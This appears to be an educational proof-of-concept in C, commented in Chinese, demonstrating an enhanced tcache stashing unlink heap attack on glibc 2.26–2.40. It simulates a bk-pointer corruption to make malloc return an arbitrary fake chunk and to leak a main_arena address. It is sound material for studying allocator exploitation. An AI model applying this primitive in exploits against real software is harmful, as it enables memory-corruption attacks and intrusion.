/*
 * 手法：二次增强版 tcache 暂存解链攻击（TSU++）。
 * 适用：glibc 2.26～2.40。
 *
 * 漏洞模型：能修改 smallbin victim 的 bk。
 * 同一次 stashing 能同时拿到两个结果：
 *   1. 任意地址的 fake_chunk 被挂进 tcache，随后由 malloc 返回；
 *   2. fake_chunk->bk->fd = bin，把 main_arena/smallbin 的地址写进 secret。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    __attribute__((aligned(16))) size_t fake_chunk[4] = {0};
    volatile size_t gap[0x50] = {0}; /* 避免 fake_chunk 和 secret 意外重叠 */
    size_t secret = 0;
    size_t *chunks[12];
    size_t *result;

    setbuf(stdout, NULL);
    (void)gap;

    /* 7 个用来填满 tcache；另外 5 个由 guard 隔开，释放后分别进入 unsorted bin。 */
    for (int i = 0; i < 7; ++i)
        chunks[i] = malloc(0x100);
    for (int i = 0; i < 5; ++i) {
        chunks[7 + i] = malloc(0x100);
        (void)malloc(0x10);
    }

    for (int i = 0; i < 12; ++i)
        free(chunks[i]);

    /* tcache 从 7 个减到 2 个；大请求把这 5 个 unsorted chunk 排进 smallbin。
     * 随后的 calloc 会取走一个并继续做 stash，容量正好够遍历到伪造节点。
     */
    for (int i = 0; i < 5; ++i)
        (void)malloc(0x100);
    (void)malloc(0x200);

    /* 漏洞模拟：让真实 victim 的 bk 指向 fake header。
     * fake header 的 bk 字段位于 fake_chunk 用户区 +8，让它指向
     * secret-0x10；循环执行 bck->fd = bin 时，fd 正好落在 secret 上。
     */
    chunks[11][1] = (size_t)fake_chunk - 0x10;
    fake_chunk[1] = (size_t)&secret - 0x10;

    (void)calloc(1, 0x100);
    result = malloc(0x100);

    printf("[+] TSU++：结果=%p，伪块=%p，值=%#zx\n",
           (void *)result, (void *)fake_chunk, secret);
    assert(result == fake_chunk);
    assert(secret != 0);              /* 这里应该是 main_arena/smallbin 的地址 */
    return 0;
}
